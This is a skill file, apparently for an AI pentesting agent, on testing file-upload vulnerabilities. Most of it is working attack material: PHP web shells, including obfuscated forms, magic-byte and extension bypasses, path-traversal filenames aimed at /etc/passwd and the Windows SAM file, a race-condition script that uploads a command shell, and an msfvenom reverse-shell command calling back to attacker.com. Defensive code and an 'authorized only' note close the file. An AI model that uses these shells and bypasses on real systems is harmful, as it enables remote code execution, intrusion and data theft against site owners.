---
name: file-upload-testing
description: Professional skills and methodology for file-upload vulnerability testing
version: 1.0.0
---

# File-Upload Vulnerability Testing

## Overview

File upload is a common web application feature with many security risks. This skill provides detection, exploitation, and defense methods for file-upload vulnerabilities.

## Vulnerability types

### 1. Unvalidated file type

**Client-side validation only:**
```javascript
// Bypassable
if (!file.name.endsWith('.jpg')) {
  alert('Only images allowed');
}
```

### 2. File content not validated

**Extension check only:**
```php
// Dangerous code
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Path traversal

**Unfiltered filename:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. Filename overwrite

**Predictable filenames:**
```
uploads/1.jpg
uploads/2.jpg
```

## Testing methodology

### 1. Basic detection

**Test various file types:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Test double extensions:**
```
shell.php.jpg
shell.jpg.php
```

**Test case variations:**
```
shell.PHP
shell.PhP
```

### 2. Content-Type bypass

**Modify Content-Type:**
```
Content-Type: image/jpeg
# while the file body is PHP code
```

**Magic bytes:**
```php
// Prepend an image header to PHP code
GIF89a<?php phpinfo(); ?>
```

### 3. Parser vulnerabilities

**Apache parsing quirk:**
```
shell.php.xxx  # Apache may parse as PHP
```

**IIS parsing quirks:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx parsing quirk:**
```
shell.jpg%00.php
```

### 4. Race condition

**Hit the file right after upload:**
```python
# Upload a .php file and access it after upload completes but before deletion
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Exploitation techniques

### PHP WebShell

**Basic WebShell:**
```php
<?php system($_GET['cmd']); ?>
```

**One-liner:**
```php
<?php eval($_POST['a']); ?>
```

**Filter bypass:**
```php
<?php
$_GET['cmd']($_POST['a']);
// usage: ?cmd=system
```

### .htaccess exploitation

**Upload .htaccess:**
```
AddType application/x-httpd-php .jpg
```

**Then upload shell.jpg (actually PHP code)**

### Image-based shells

**GIF shell:**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG shell:**
```bash
# Embed PHP code into a PNG with a tool
python3 png2php.py shell.php shell.png
```

### Combine with file inclusion

**If an LFI exists:**
```
# Upload an image containing PHP code
# then execute it via the inclusion
?file=uploads/shell.jpg
```

## Bypass techniques

### Extension bypass

**Double extensions:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Case variations:**
```
shell.PHP
shell.PhP
```

**Special characters:**
```
shell.php.
shell.php 
shell.php%20
```

### Content-Type bypass

**Modify request headers:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic-bytes bypass

**Prepend file signatures:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Code obfuscation

**Short tags:**
```php
<?= system($_GET['cmd']); ?>
```

**Variable functions:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Tool usage

### Burp Suite

1. Intercept the file-upload request
2. Modify filename and content
3. Try various bypass techniques

### Upload Bypass

```bash
# Test file upload with various techniques
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShell generation

```bash
# Generate various WebShells
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Verification and reporting

### Verification steps

1. Confirm a malicious file can be uploaded
2. Verify the file executes
3. Assess impact (command execution, data leakage, etc.)
4. Record a complete PoC
5. Log the confirmed vulnerability via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting essentials

- Vulnerability location and upload feature
- Uploadable file types and execution path
- Complete exploitation steps and PoC
- Remediation advice (file-type validation, content checks, safe storage, etc.)

## Defenses

### Recommended

1. **File-type allowlist**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **File-content validation**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Rename files**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Isolated storage**
   - Store files outside the web root
   - Serve via a script proxy
   - Disable execute permission

5. **File scanning**
   - Scan with antivirus
   - Inspect file content
   - Strip execute bits

6. **Size limits**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Notes

- Test only in authorized environments
- Avoid uploading malicious files to production
- Clean up after testing
- Mind parsing differences across servers
